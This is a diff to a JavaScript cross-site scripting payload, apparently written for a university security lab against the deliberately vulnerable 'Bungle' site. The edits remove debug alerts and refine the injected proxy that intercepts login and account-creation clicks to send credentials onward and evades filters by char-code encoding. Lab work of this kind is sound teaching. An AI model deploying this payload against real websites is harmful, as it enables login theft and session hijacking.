@@ -32,8 +32,6 @@ function payload(attacker) {
 	}
 
 	function proxy(href, qry) {
-		alert(1);
-
 		if (window.history.state != null) {
 			curUid = window.history.state.UID;
 			history.replaceState(window.history.state, "", href);
@@ -44,7 +42,7 @@ function payload(attacker) {
 
 		$("html").load(href, function() {
 			$("html").show();
-			if (qry == null || qry.length == 0) {
+			if (qry == null || qry.length == 0 || qry == "./") {
 				$("#query").val("pwned!");
 			} else {
 				$("#query").val(qry);
@@ -60,14 +58,12 @@ function payload(attacker) {
 			});
 
 			$("#log-in-btn").on("click", function(event) {
-				alert("here login");
 				event.preventDefault();
 				sendPostRequest("login", "login");
 
 			});
 
 			$("#new-account-btn").on("click", function(event) {
-				alert("here create");
 				event.preventDefault();
 				sendPostRequest("create", "login");
 			});
@@ -98,6 +94,7 @@ function payload(attacker) {
 					$(this).click("submit", function(event) {
 						event.preventDefault();
 						sCrit = $(this).attr("href");
+						sCrit = sCrit.replace(/ /g, "+");
 						proxy("./" + sCrit, sCrit);
 					});
 				});
@@ -106,16 +103,15 @@ function payload(attacker) {
 			$("#search-again-btn").on("click", function(event) {
 				event.preventDefault();
 				addHistory(href);
-				proxy("./", "");		
+				proxy("./");
 			});
 
 			$("#search-btn").on("click", function(event) {
 				event.preventDefault();
 				sCrit = $("#query").val();
-				alert("here searcj:" + sCrit);
+				sCrit = sCrit.replace(/ /g, "+");
 				addHistory(href);
-				var outputUrl = "./search?q=" + sCrit;
-				proxy(outputUrl);
+				proxy("./search?q=" + sCrit, sCrit);
 			});
 
 
@@ -156,9 +152,10 @@ function convertToCharCode(data) {
 function processUrl(url) {
 	var regex = /\"[^\"]*\"/; //match double quotes. Our script does not have any single quotes.
 	var match = regex.exec(url);
-
+	var encoded = "";
 	while (match != null) {
-		url = url.replace(regex, convertToCharCode(match.toString()));
+		encoded = convertToCharCode(match.toString());
+		url = url.replace(regex, encoded);
 		match  = regex.exec(url);
 	}
 
@@ -193,7 +190,6 @@ $(function() {
 	for (i = 0; i <= 3; i++) {
 		xssdefense = i;
 		head = "defense" + i;
-		alert(head);
 		var url = makeLink(xssdefense,target, attacker);
 		$("#" + head).html("<a target=\"run\" href=\"" + url + "\">Try Bungle! xssdefense=" + xssdefense.toString() + "</a>");
 
